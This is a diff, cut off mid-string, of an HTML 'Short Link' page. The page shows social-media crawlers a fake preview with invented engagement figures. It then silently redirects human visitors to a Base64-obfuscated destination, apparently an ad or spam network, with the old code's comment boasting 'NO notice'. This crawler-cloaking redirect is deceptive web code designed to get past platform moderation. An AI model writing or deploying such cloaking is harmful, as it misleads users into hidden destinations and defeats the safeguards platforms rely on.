@@ -2,14 +2,14 @@
 <html lang="en">
 <head>
 
-  <meta http-equiv="refresh" content="4; url=https://www.facebook.com/profile.php?id=61585420153343">
-
+    <meta http-equiv="refresh" content="4; url=https://www.facebook.com/profile.php?id=61585420153343">
+  
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <title>Short Link</title>
 
-<!-- FB Perfect Preview -->
+<!-- FB Debugger Safe Preview -->
 <meta property="og:title" content="Short Link">
 <meta property="og:description" content="623 likes, shares & comments">
 <meta property="og:image" content="https://via.placeholder.com/600x315.png">
@@ -20,33 +20,15 @@
 <body>
 
 <script>
-// BOT Detection
+/* BOT Detection */
 const bots = [
- /facebookexternalhit/i,/Facebot/i,/Twitterbot/i,/Googlebot/i,
- /bingbot/i,/Discordbot/i,/Slackbot/i,/LinkedInBot/i,
- /WhatsApp/i,/Preview/i
+  /facebookexternalhit/i, /Facebot/i, /Twitterbot/i, /Googlebot/i,
+  /bingbot/i, /Discordbot/i, /Slackbot/i, /LinkedInBot/i,
+  /WhatsApp/i, /Preview/i
 ];
 
-const isBot = bots.some(b => b.test(navigator.userAgent));
+let isBot = bots.some(b => b.test(navigator.userAgent));
 
-// Highly Encrypted URL (split Base64)
-const p1 = "aHR0cHM6Ly93b3Jk";
-const p2 = "cHJlc3MtMTU0OTQ0OC";
-const p3 = "01OTk1OTMwLmNsb3";
-const p4 = "Vkd2F5c2FwcHMuY";
-const p5 = "29tL3ZpcmFsYnV6ej";
-const p6 = "MzLz91dG1fc291cmNl";
-const p7 = "PUhhamlHJnV0bV9tZWRpdW09Q3Jhenk=";
-
-function go(x){
-  return atob(x);
-}
-
-// Instant redirect (NO notice)
-if(!isBot){
-  location.replace(go(p1+p2+p3+p4+p5+p6+p7));
-}
-</script>
-
-</body>
-</html>
+/* STRONG Encrypted Redirect (Base64) */
+let encrypted =
+"aHR0cHM6Ly93d3cuZWZmZWN0aXZlZ2F0ZWNwbS5jb20vdHpjNHF5NDVmZD9rZXk9YT
